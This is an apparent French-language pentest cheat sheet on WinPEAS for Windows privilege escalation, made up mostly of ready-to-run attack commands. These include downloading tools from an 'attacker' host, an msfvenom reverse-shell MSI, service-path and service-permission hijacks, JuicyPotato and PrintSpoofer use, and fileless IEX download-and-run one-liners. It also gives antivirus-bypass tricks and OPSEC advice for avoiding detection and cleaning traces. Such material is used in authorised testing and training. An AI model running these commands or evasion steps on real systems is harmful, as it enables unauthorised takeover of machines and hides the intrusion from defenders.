# WinPEAS - Windows Privilege Escalation Awesome Script

## 🗂️ Workflow d'utilisation WinPEAS
1. Upload/exécution du script sur la cible Windows
   ↓
2. Énumération automatisée complète du système
   ↓
3. Analyse des vulnérabilités par couleur/priorité
   ↓
4. Exploitation des vecteurs identifiés
   ↓
5. Validation de l'escalade de privilèges
   ↓
6. Nettoyage des traces

## 📋 Vue d'ensemble

WinPEAS est un script d'énumération automatisée pour Windows qui identifie les vecteurs d'escalade de privilèges potentiels. Il analyse les configurations système, services, permissions et vulnérabilités connues.

> **💡 Explication Simple** : C'est un scanner automatique qui fouille le système Windows pour trouver toutes les failles et mauvaises configurations qui permettraient d'obtenir plus de privilèges.

## ⚡ Installation et Exécution

### Versions disponibles
```powershell
# WinPEAS.exe (version compilée)
# WinPEAS.bat (version batch)
# WinPEASx64.exe (version 64 bits)
# WinPEASany.exe (version .NET any CPU)
```

### Téléchargement et transfert
```powershell
# Serveur web sur attaquant
python3 -m http.server 8000

# Download sur cible
powershell -c "Invoke-WebRequest -Uri 'http://attacker:8000/winPEAS.exe' -OutFile 'C:\Windows\Temp\winpeas.exe'"
certutil -urlcache -f http://attacker:8000/winPEAS.exe winpeas.exe

# Via SMB
copy \\attacker\share\winPEAS.exe C:\Windows\Temp\
```

### Exécution avec options
```cmd
# Exécution basique
winPEAS.exe

# Mode quiet (moins verbeux)
winPEAS.exe quiet

# Mode cmd (version batch)
winPEAS.bat

# Avec output vers fichier
winPEAS.exe > output.txt

# Mode specifique checks
winPEAS.exe systeminfo userinfo
```

## 🎯 Sections d'Analyse Principales

### System Information
- Version Windows et patches
- Architecture (x86/x64)
- Antivirus et protections
- Variables d'environnement
- Mounted drives et permissions

### Users & Groups Analysis
- Utilisateurs locaux et domaine
- Groupes privilégiés
- Sessions actives
- Privilèges utilisateur actuel
- Password policies

### Services & Processes
- Services avec permissions faibles
- Processus avec privilèges élevés
- Services non-Microsoft
- Unquoted service paths
- Writable service binaries

### Registry & Files
- Autorun entries
- AlwaysInstallElevated
- Writable folders dans PATH
- Scheduled tasks
- Recent files et historique

## 🔍 Code Couleur et Priorités

### Rouge (99%) - Critique
```cmd
# Escalade quasi-garantie
- AlwaysInstallElevated enabled
- Unquoted service paths writable
- SeImpersonatePrivilege + Windows < 2019
- Writable service executables
- Modifiable scheduled tasks running as SYSTEM
```

### Jaune (95%) - Très probable
```cmd
# Escalade très probable
- Weak service permissions
- Writeable folders in PATH
- Stored credentials in registry
- Juicy potato conditions
- DLL hijacking opportunities
```

### Vert (75%) - Possible
```cmd
# Escalade possible avec exploitation
- Interesting files in user folders
- Running processes information
- Network configuration
- Installed software versions
- Environment variables
```

## ⚔️ Exploitation des Découvertes

### AlwaysInstallElevated
```cmd
# Vérification registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploitation si activé
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### Unquoted Service Paths
```cmd
# Vérification paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Exploitation
# Si service path : C:\Program Files\Some Service\service.exe
# Créer : C:\Program.exe ou C:\Program Files\Some.exe
copy evil.exe "C:\Program Files\Some.exe"
sc stop "VulnService"
sc start "VulnService"
```

### SeImpersonatePrivilege
```cmd
# Vérification privilège
whoami /priv | findstr SeImpersonatePrivilege

# Exploitation avec JuicyPotato (Windows < 2019)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c evil.exe" -t *

# PrintSpoofer (Windows 2019+)
PrintSpoofer.exe -i -c cmd
```

### Weak Service Permissions
```cmd
# Énumération permissions services
accesschk.exe -uwcqv "Authenticated Users" *
sc qc "VulnService"

# Modification service binary path
sc config "VulnService" binpath= "evil.exe"
sc start "VulnService"
```

## 🎭 Techniques d'Evasion

### Bypass Antivirus
```powershell
# Obfuscation PowerShell
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('winPEAS.exe'))
powershell -EncodedCommand $encoded

# Execution en mémoire
IEX (New-Object Net.WebClient).DownloadString('http://attacker/winPEAS.ps1')

# Via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").exec("cmd /c winPEAS.exe");
```

### Techniques stealth
```cmd
# Exécution sans fichier sur disque
powershell -WindowStyle Hidden -Command "& {IEX (New-Object Net.WebClient).DownloadString('http://attacker/winPEAS.ps1')}"

# Via WMI
wmic process call create "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/winPEAS.ps1')"
```

## 🔄 Automatisation Post-WinPEAS

### Script d'exploitation automatique
```powershell
# Script PowerShell post-WinPEAS
$output = & .\winPEAS.exe
if ($output -match "AlwaysInstallElevated.*1") {
    Write-Host "AlwaysInstallElevated trouvé !"
    # Exploitation automatique
}

if ($output -match "SeImpersonatePrivilege.*Enabled") {
    Write-Host "SeImpersonatePrivilege disponible !"
    # Lancement JuicyPotato/PrintSpoofer
}
```

### Parsing des résultats
```python
# Script Python pour parser WinPEAS
import re

def parse_winpeas(output_file):
    with open(output_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    
    # Extraction des vulnérabilités critiques
    critical = re.findall(r'.*99%.*', content)
    high = re.findall(r'.*95%.*', content)
    
    return critical, high

# Génération rapport
critical, high = parse_winpeas('winpeas_output.txt')
print(f"Vulnérabilités critiques: {len(critical)}")
```

## 🛡️ Conseils OPSEC

### Minimiser détection
- Exécuter durant les heures de maintenance
- Utiliser la version batch pour éviter les signatures
- Rediriger output vers fichier temporaire
- Supprimer immédiatement les artefacts

### Techniques furtives
```cmd
# Execution in memory via PowerShell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File winPEAS.ps1

# Via scheduled task temporaire
schtasks /create /tn "TempTask" /tr "winPEAS.exe" /sc once /st 23:59
schtasks /run /tn "TempTask"
schtasks /delete /tn "TempTask" /f
```

## ⚠️ Erreurs fréquentes

### Détection par sécurité
- Utiliser la version .exe originale (signatures connues)
- Laisser des fichiers traînants sur le système
- Exécuter en journée sur systèmes surveillés
- Ignorer les protections EDR/XDR

### Exploitation ratée
- Se fier aveuglément aux priorités couleur
- Ne pas vérifier manuellement les découvertes
- Oublier de tester en environnement de test
- Ignorer le contexte système (patches, protections)

## 💡 Astuces

### Optimisation scanning
- Combiner avec PowerUp pour double vérification
- Utiliser accesschk pour permissions détaillées
- Croiser avec exploit-suggester pour CVEs
- Intégrer dans frameworks C2

### Techniques alternatives
```powershell
# PowerUp alternative
. .\PowerUp.ps1; Invoke-AllChecks

# JAWS alternative
. .\jaws-enum.ps1

# Sherlock pour patches manquants
. .\Sherlock.ps1; Find-AllVulns
```

## 🔗 Pour aller plus loin

- [PEASS-ng Repository](https://github.com/carlospolop/PEASS-ng)
- [PayloadsAllTheThings Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Windows Privilege Escalation Guide](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
- [FuzzySecurity Windows PrivEsc](https://www.fuzzysecurity.com/tutorials/16.html)

## 🧭 Navigation

- [Guide LinPEAS](./LinPEAS.md)
- [Guide PrivEsc Windows](../Windows/)
- [Retour aux outils d'escalade](./README.md)
- [Post-exploitation](../../03-Post-Exploitation/) 